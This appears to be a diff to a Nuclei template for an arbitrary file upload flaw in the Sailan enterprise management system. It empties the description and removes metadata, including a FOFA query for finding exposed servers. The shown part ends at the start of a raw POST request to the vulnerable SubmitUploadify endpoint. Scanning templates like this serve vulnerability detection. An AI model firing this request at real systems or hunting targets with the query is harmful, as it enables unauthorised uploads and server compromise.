@@ -3,12 +3,8 @@ info:
   name: 赛蓝企业管理系统-SubmitUploadify-任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dvtfbxd0o9zzvl06'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dvtfbxd0o9zzvl06
-    fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
 http:
 - raw:
   - 'POST /EHRModule/EHR_Holidays/SubmitUploadify?FolderId=1&UserId=1 HTTP/1.1
